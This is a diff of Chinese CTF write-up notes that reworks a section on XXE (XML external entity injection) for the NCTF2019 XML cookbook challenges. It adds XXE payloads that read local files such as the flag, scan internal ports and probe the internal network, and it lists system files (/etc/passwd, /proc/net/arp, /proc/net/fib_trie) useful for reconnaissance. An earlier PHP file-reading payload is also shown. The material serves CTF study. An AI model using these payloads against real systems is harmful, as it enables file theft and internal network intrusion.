@@ -1612,9 +1612,12 @@ escapeshellcmd — shell 元字符转义
 
 payload:`?exp=print_r(highlight_file(next(array_reverse(scandir(current(localeconv()))))));`
 
-## NCTF2019 Fake XML cookbook(XXE漏洞)
+## XXE-XML External Entity Injection(XML外部实体注入)
+
+### NCTF2019 Fake/True XML cookbook
 
 [从XML相关一步一步到XXE漏洞](https://xz.aliyun.com/t/6887?time__1311=n4%2BxnD0DRDyB5AKDsYohrYYK0KmvD7KPx&alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F6887#toc-2)
+[XXE漏洞详细讲解](https://xz.aliyun.com/t/3357#toc-23)
 
 1. XXE漏洞原理：发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。XXE漏洞触发的点往往是可以上传XML文件的位置，没有对上传的XML文件进行过滤，导致可上传恶意XML文件。
 
@@ -1623,59 +1626,38 @@ payload:`?exp=print_r(highlight_file(next(array_reverse(scandir(current(localeco
    - SYSTEM、PUBLIC（外部资源申请）
 
    ```xml
-    内部实体
-    <!ENTITY 实体名称 "实体值">
-
-    外部实体
-    <!ENTITY 实体名称 SYSTEM "URL">
+   <?xml version = "1.0" encoding = "utf-8"?>
+    <!DOCTYPE test [
+        <!-- 读文件 -->
+        <!ENTITY admin SYSTEM "file:///flag">
+        <!-- 内网端口扫描 -->
+        <!ENTITY test SYSTEM "http://ip:port/">
+        <!-- 内网探测 -->
+        <!ENTITY test SYSTEM "https://ip">
+    ]>
+    <user><username>&admin;</username><password>{任意值}</password></user>
    ```
+   **内网探测用到的文件**
+    - /etc/hosts 储存域名解析的缓存
+    - /etc/passwd 用户密码
+    - /proc/net/arp 每个网络接口的arp表中dev包
+    - /proc/net/fib_trie ipv4路由表
 
-2. 源码
-
-   ```javascript
-    function doLogin(){
-        var username = $("#username").val();
-        var password = $("#password").val();
-        if(username == "" || password == ""){
-            alert("Please enter the username and password!");
-            return;
-        }
-        
-        var data = "<user><username>" + username + "</username><password>" + password + "</password></user>"; 
-        $.ajax({
-            type: "POST",
-            url: "doLogin.php",
-            contentType: "application/xml;charset=utf-8",
-            data: data,
-            dataType: "xml",
-            anysc: false,
-            success: function (result) {
-                var code = result.getElementsByTagName("code")[0].childNodes[0].nodeValue;
-                var msg = result.getElementsByTagName("msg")[0].childNodes[0].nodeValue;
-                if(code == "0"){
-                    $(".msg").text(msg + " login fail!");
-                }else if(code == "1"){
-                    $(".msg").text(msg + " login success!");
-                }else{
-                    $(".msg").text("error:" + msg);
-                }
-            },
-            error: function (XMLHttpRequest,textStatus,errorThrown) {
-                $(".msg").text(errorThrown + ':' + textStatus);
-            }
-        }); 
-    }
-   ```
-
-   payload:
+2. payload:
 
    ```xml
+   <!-- Fake -->
     <?xml version = "1.0" encoding = "utf-8"?>
     <!DOCTYPE test [
         <!ENTITY admin SYSTEM "file:///flag">
     ]>
-
     <user><username>&admin;</username><password>1123</password></user>
+    <!-- True -->
+    <?xml version = "1.0" encoding = "utf-8"?>
+    <!DOCTYPE test [
+        <!ENTITY test SYSTEM "http://10.253.81./">
+    ]>
+    <user><username>&test;</username><password>1123</password></user>
    ```
 
 ## BJDCTF2020 Mark loves cat
